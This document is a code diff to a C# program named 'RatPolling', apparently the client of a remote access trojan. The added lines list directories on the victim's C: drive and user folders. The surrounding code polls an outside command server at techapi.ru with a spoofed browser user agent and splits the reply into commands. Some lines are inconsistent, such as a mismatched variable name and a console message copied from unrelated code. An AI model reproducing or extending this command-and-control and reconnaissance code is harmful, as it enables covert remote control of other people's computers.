@@ -13,6 +13,20 @@ namespace RatPolling
             string CurrentUser = Environment.UserName;
 
 
+            try
+            {
+                string[] dirsForScan = { "c:\\", "C:\\Program Files", "C:\\Users", "C:\\Users\\"+ CurrentUser, "","" };
+                string[] dirs = Directory.GetDirectories(@"c:\");
+                Console.WriteLine("The number of directories starting with p is {0}.", dirs.Length);
+                foreach (string dir in dirs)
+                {
+                    Console.WriteLine(dir);
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("The process failed: {0}", e.ToString());
+            }
 
 
             Console.WriteLine("Connection..." + CurrentUser);
@@ -22,12 +36,15 @@ namespace RatPolling
                 {
                     WebClient client = new WebClient();
                     client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
+
                     Stream data = client.OpenRead("http://techapi.ru/command.php?UIN=" + UserName);
                     StreamReader reader = new StreamReader(data);
                     string s = reader.ReadToEnd();
                     Console.WriteLine(s);
                     data.Close();
                     reader.Close();
+
+
                
                 string[] commands = s.Split('|');
 
